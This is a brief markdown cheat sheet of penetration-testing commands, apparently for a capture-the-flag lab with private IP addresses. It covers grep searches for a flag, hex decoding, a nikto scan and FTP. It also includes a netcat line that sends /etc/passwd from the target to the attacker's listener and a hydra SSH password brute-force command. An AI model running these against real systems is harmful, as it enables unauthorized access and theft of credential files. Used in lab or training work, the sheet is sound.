## Quick and Dirty Commands

For the following examples assume:

**Remote IP:** `10.37.129.11`
**Local IP:** `10.37.129.4`

##### Find a file with the a specified string
`cat /etc/* | grep FLAG2`

##### Regex in Grep
`ls -al | grep '[a-z][0-9].jpeg'`

##### HEX to ASCII convert
`echo "46 4c 41 47" | xxd -r -ps`

##### Check webserver for things
`nikto -h 10.37.129.11`

##### FTP on custom port
`ftp -p 10.37.129.11 4200`

##### Search for a package on the system
`rpm -qa | grep ftp`

##### Copy file over netcat | nc
Local Listener: `nc -l -p 2222 > passwd`

Remote Listener: `cat /etc/passwd | netcat 10.37.129.4 2222`

##### Hydra quick user/password enumeration
`hydra -L /usr/share/wordlists/custom/usernamelist.txt -P /usr/share/wordlists/custom/passwordlist.txt -u -s 22 10.37.129.11 ssh -t 4`